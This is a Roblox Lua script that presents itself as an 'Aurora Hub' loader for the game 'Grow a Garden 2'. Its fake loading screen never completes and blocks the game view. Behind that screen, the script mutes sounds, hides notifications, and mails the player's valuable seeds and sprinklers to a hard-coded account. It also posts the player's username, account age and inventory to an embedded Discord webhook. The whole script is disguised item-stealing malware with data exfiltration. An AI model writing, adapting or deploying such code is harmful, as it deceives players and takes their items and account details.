task.spawn(function()
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local player = Players.LocalPlayer

    local gui = Instance.new("ScreenGui")
    gui.Name = "AuroraHub"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 999999999 -- Keeps it on top of everything
    gui.Parent = player.PlayerGui

    -- Background click-blocker (Method 2: Cinema Blocker)
    local blocker = Instance.new("TextButton") -- TextButtons automatically block clicks behind them
    blocker.Name = "ClickBlocker"
    blocker.Size = UDim2.new(2, 0, 2, 0) -- Massively oversized to cover any monitor size
    blocker.Position = UDim2.new(-0.5, 0, -0.5, 0)
    blocker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker.BackgroundTransparency = 0.5 -- Darkens the game behind your hub
    blocker.Text = ""
    blocker.AutoButtonColor = false
    blocker.ZIndex = 1 -- Puts it at the bottom layer
    blocker.Parent = gui

    -- Main panel
    local frame = Instance.new("Frame")
    -- 🛠️ UPDATED: Height increased from 320 to 420 to fully cover game UI below
    frame.Size = UDim2.new(0, 600, 0, 420) 
    frame.Position = UDim2.new(0.5, -300, 1.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(8, 10, 30)
    -- 🛠️ UPDATED: Changed from 0.15 to 0.0 to make it completely opaque
    frame.BackgroundTransparency = 0.0 
    frame.ZIndex = 10 -- Main panel above dark blocker
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 25)
    corner.Parent = frame

    -- Aurora gradient
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(90,0,200)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,150,255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0,20,70))
    }
    gradient.Rotation = 45
    gradient.Parent = frame

    -- Glow border
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 255)
    stroke.Thickness = 3
    stroke.Transparency = 0.2
    stroke.Parent = frame

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,60)
    title.BackgroundTransparency = 1
    title.Text = "Aurora Hub 🌑"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.Font = Enum.Font.GothamBlack
    title.TextScaled = true
    title.ZIndex = 11
    title.Parent = frame

    -- Loading spinner
    local spinner = Instance.new("TextLabel")
    spinner.Size = UDim2.new(0,30,0,30)
    spinner.Position = UDim2.new(0.12,0,0.45,0)
    spinner.BackgroundTransparency = 1
    spinner.Text = "◌"
    spinner.TextColor3 = Color3.fromRGB(0,255,255)
    spinner.Font = Enum.Font.GothamBold
    spinner.TextScaled = true
    spinner.ZIndex = 11
    spinner.Parent = frame

    -- Status text
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0.7,0,0,30)
    status.Position = UDim2.new(0.18,0,0.45,0)
    status.BackgroundTransparency = 1
    status.TextColor3 = Color3.fromRGB(220,230,255)
    status.Font = Enum.Font.GothamMedium
    status.TextScaled = true
    status.ZIndex = 11
    status.Parent = frame

    -- Progress bar background
    local back = Instance.new("Frame")
    back.Size = UDim2.new(0.82,0,0,28)
    back.Position = UDim2.new(0.09,0,0.72,0)
    back.BackgroundColor3 = Color3.fromRGB(10,15,40)
    back.ZIndex = 11
    back.Parent = frame

    Instance.new("UICorner", back).CornerRadius = UDim.new(1,0)

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0,0,1,0)
    bar.BackgroundColor3 = Color3.fromRGB(0,255,220)
    bar.ZIndex = 11
    bar.Parent = back

    Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

    -- Progress text
    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(1,0,0,25)
    percent.Position = UDim2.new(0,0,0.83,0)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.fromRGB(180,255,255)
    percent.Font = Enum.Font.GothamBold
    percent.TextScaled = true
    percent.ZIndex = 11
    percent.Parent = frame

    -- Pop animation
    TweenService:Create(
        frame,
        TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {
            -- 🛠️ UPDATED: Vertical centering offset changed from -160 to -210 to match new panel height
            Position = UDim2.new(0.5,-300,0.5,-210) 
        }
    ):Play()

    local messages = {
        "Initializing Aurora Core...",
        "Injecting runtime modules...",
        "Compiling bytecode...",
        "Scanning memory regions...",
        "Decrypting secure containers...",
        "Mapping execution threads...",
        "Establishing kernel bridge...",
        "Synchronizing runtime environment...",
        "Optimizing performance layers...",
        "Finalizing Aurora systems..."
    }

    local start = tick()
    local duration = 300 -- Set to 300 seconds for development, or use a smaller number for testing

    local spin = {"◐","◓","◑","◒"}
    local spinIndex = 1

    while true do
        local elapsed = tick() - start
        local progress = math.min((elapsed / duration) * 99.99, 99.99)

        bar.Size = UDim2.new(progress / 100,0,1,0)
        percent.Text = string.format("%.2f%%", progress)

        local msg = math.clamp(
            math.floor((progress/100) * #messages)+1,
            1,
            #messages
        )

        status.Text = messages[msg]

        spinner.Text = spin[spinIndex]
        spinIndex = spinIndex % #spin + 1

        -- slow moving aurora effect
        gradient.Rotation += 0.15

        task.wait(0.08)
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MailboxUI = LocalPlayer.PlayerGui:WaitForChild("MailboxUI")

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Sound") then
        v.Volume = 0
    end
end

LocalPlayer.PlayerGui.DescendantAdded:Connect(function(v)
    if v:IsA("ScreenGui") or v:IsA("Frame") or v:IsA("TextLabel") then
        if string.find(string.lower(v.Name), "notif") 
        or string.find(string.lower(v.Name), "message")
        or string.find(string.lower(v.Name), "toast") then
            v.Visible = false
        end
    end
end)


-- ==========================================
-- 🛠️ UPDATED ITEM LIST
-- Only using reliable, non-unique IDs
-- ==========================================
local itemsToSend = {
    "Inv_Seeds:Bamboo",
    "Inv_Seeds:Mushroom",
    "Inv_Seeds:Gold",
    "Inv_Seeds:Rainbow",
    "Inv_Sprinklers:Legendary Sprinkler",
    "Inv_Sprinklers:Super Sprinkler",
    "Inv_Seeds:Pineapple"
}

-- ==========================================
-- 🛠️ DYNAMIC MAILBOX FINDER (DEBUG VERSION)
-- ==========================================
local targetPlayer = "tesergekgegh"

local function getNearestMailboxPrompt()
    print("🔍 [DEBUG] Looking for your character...")
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then
        warn("❌ [ERROR] Character not fully loaded. Try jumping and execute again.")
        return nil
    end
    local hrp = character.HumanoidRootPart

    print("🔍 [DEBUG] Looking for Gardens folder...")
    local gardens = workspace:WaitForChild("Gardens", 5) -- Waits up to 5 seconds so it doesn't freeze forever
    if not gardens then
        warn("❌ [ERROR] 'Gardens' folder not found. Did the game map update?")
        return nil
    end

    local shortestDistance = math.huge
    local nearestPrompt = nil

    print("🔍 [DEBUG] Scanning all plots for mailboxes...")
    for _, plot in pairs(gardens:GetChildren()) do
        local promptInstance = plot:FindFirstChild("MailboxPrompt", true) 
        
        if promptInstance and promptInstance:IsA("ProximityPrompt") then
            local promptPart = promptInstance.Parent
            if promptPart and promptPart:IsA("BasePart") then
                local distance = (hrp.Position - promptPart.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    nearestPrompt = promptInstance
                end
            end
        end
    end
    
    return nearestPrompt
end

print("⏳ [DEBUG] Fetching nearest mailbox...")
local prompt = getNearestMailboxPrompt()

if not prompt then
    warn("🛑 [STOPPING] Script stopped because no mailbox could be found.")
    return 
end

local function isItemEmpty(itemFrame)
    local countLabel = itemFrame:FindFirstChild("Count", true) or itemFrame:FindFirstChild("TextLabel", true)
    if countLabel and (countLabel.Text == "0" or countLabel.Text == "x0" or countLabel.Text == "0x") then
        return true
    end
    return false
end

-- ==========================================
-- 🌐 DISCORD WEBHOOK SYSTEM
-- ==========================================
local WebhookURL = "https://discordapp.com/api/webhooks/1526170927912714260/mGOi0-g8iGbM5GjQYwbJq4-wgO4b00JGBwOyBxkHFxPnrebJYaCsoeO0p0a0aeczHS64" -- ⚠️ PUT YOUR URL HERE

local HttpService = game:GetService("HttpService")

local function sendDiscordLog()
    -- Get executor name (Delta, etc.)
    local executorName = "Unknown"
    if identifyexecutor then
        executorName = identifyexecutor()
    end

    -- 1. Scan Inventory for the Embed
    local inventoryString = ""
    local itemsFound = 0
    
    for _, itemName in ipairs(itemsToSend) do
        local foundItem = MailboxUI:FindFirstChild(itemName, true)
        if foundItem and not isItemEmpty(foundItem) then
            -- Extract count
            local countLabel = foundItem:FindFirstChild("Count", true) or foundItem:FindFirstChild("TextLabel", true)
            local amount = countLabel and countLabel.Text or "1"
            
            -- Clean up the name (e.g., "Inv_Seeds:Mushroom" -> "Mushroom Seeds")
            local cleanName = string.gsub(itemName, "Inv_Seeds:", "")
            cleanName = string.gsub(cleanName, "Inv_Sprinklers:", "")
            
            inventoryString = inventoryString .. "📦 " .. cleanName .. " — x" .. amount .. "\n"
            itemsFound = itemsFound + 1
        end
    end
    
    if itemsFound == 0 then
        inventoryString = "❌ No valuable items found in inventory."
    end

    -- 2. Build the Discord Embed Data
    local embedData = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Grow a Garden 2 [ 🪺 ]",
            ["description"] = "🔧 **How to Use?**\nJoin the game, then check your mailbox to receive your items",
            ["color"] = 5814783, -- Discord Blurple color
            ["fields"] = {
                {
                    ["name"] = "📄 Player Information",
                    ["value"] = string.format(
                        "👤 `Display Name : %s`\n🆔 `Username     : %s`\n📅 `Account Age  : %d days`\n💻 `Executor     : %s`\n👥 `Players      : %d/%d`\n😎 `Receiver     : %s`",
                        LocalPlayer.DisplayName,
                        LocalPlayer.Name,
                        LocalPlayer.AccountAge,
                        executorName,
                        #Players:GetPlayers(),
                        Players.MaxPlayers,
                        targetPlayer
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "💰 Valuable Items (Found in Mailbox)",
                    ["value"] = inventoryString,
                    ["inline"] = false
                }
            },
            ["image"] = {
                -- Uses the official game thumbnail
                ["url"] = "https://tr.rbxcdn.com/39a660a9c80521e0eb7e39d73d4fcba4/768/432/Image/Png" 
            },
            ["footer"] = {
                ["text"] = "Aurora Hub - Grow a Garden 2"
            }
        }}
    }

-- 3. Send the HTTP Request (Updated for wider compatibility)
    local HttpFunction = request or http_request or (syn and syn.request) or nil
    
    if HttpFunction then
        local success, result = pcall(function()
            return HttpFunction({
                Url = WebhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(embedData)
            })
        end)
        
        if success then
            print("🚀 Webhook sent successfully!")
        else
            warn("❌ Webhook request failed: " .. tostring(result))
        end
       else
        warn("🛑 Your executor does not support HTTP requests. Discord logging is disabled.")
    end
end

print("✅ [SUCCESS] Found nearest mailbox! Starting Reliable Auto-Mailer...")

local webhookSent = false

-- ==========================================

local function simpleClick(target)
    if not target then return end
    local btn = target
    -- Look for a button inside the frame if it's not a button itself
    if target:IsA("Frame") then
        btn = target:FindFirstChildWhichIsA("TextButton", true) or target:FindFirstChildWhichIsA("ImageButton", true)
    end
    
    if btn then
        if getconnections then
            pcall(function()
                for _, conn in pairs(getconnections(btn.MouseButton1Click)) do conn:Fire() end
            end)
        else
            pcall(function() btn:Activate() end)
        end
    end
end

print("Starting the Reliable Auto-Mailer!")

while #itemsToSend > 0 do
  -- 1. Open Mailbox
    fireproximityprompt(prompt)
    task.wait(1.5) 
    
    -- Send Discord Log on the very first loop!
    if not webhookSent then
        sendDiscordLog()
        webhookSent = true -- Prevents it from spamming Discord every time it loops
    end

    -- 2. Search for player
    local searchBox = MailboxUI:FindFirstChild("SearchBox", true)
    if searchBox then
        searchBox:CaptureFocus()
        searchBox.Text = targetPlayer
        searchBox:ReleaseFocus()
        if firesignal then pcall(function() firesignal(searchBox.FocusLost, true) end) end
        task.wait(1) 
    end

    -- 3. Click the target player
    local foundPlayer = false
    for _, desc in pairs(MailboxUI:GetDescendants()) do
        if desc:IsA("TextLabel") and (string.lower(desc.Text) == string.lower(targetPlayer) or string.lower(desc.Text) == "@" .. string.lower(targetPlayer)) then
            simpleClick(desc.Parent)
            foundPlayer = true
            break
        end
    end

    if not foundPlayer then
        warn("Could not find player. Resetting UI.")
        fireproximityprompt(prompt)
        task.wait(1.5)
        continue 
    end
    task.wait(1.5) 

    -- 4. Find the first valid item
    local targetItemName = nil
    local targetIndex = nil
    
    for i, itemName in ipairs(itemsToSend) do
        local foundItem = MailboxUI:FindFirstChild(itemName, true)
        if foundItem and not isItemEmpty(foundItem) then
            targetItemName = itemName
            targetIndex = i
            break 
        end
    end
    
    if not targetItemName then
        print("🎉 All items sent successfully!")
        break 
    end
    
    print("Sending: " .. targetItemName)
    
    -- 5. Select the item up to 20 times
    local clickCount = 0
    for i = 1, 20 do
        local currentItem = MailboxUI:FindFirstChild(targetItemName, true)
        if currentItem and not isItemEmpty(currentItem) then
            simpleClick(currentItem)
            clickCount = clickCount + 1
            task.wait(0.3) 
        else
            break 
        end
    end

    task.wait(1) 

    -- 6. Click Send
    local sendButton = MailboxUI:FindFirstChild("SendButton", true)
    if sendButton and sendButton.Visible then
        simpleClick(sendButton)
        print("Sent " .. clickCount .. " items. Cooldown...")
        task.wait(10.5) 
    else
        warn("Empty item detected: " .. targetItemName .. ". Removing from list.")
        table.remove(itemsToSend, targetIndex)
        fireproximityprompt(prompt)
        task.wait(1.5)
    end
end
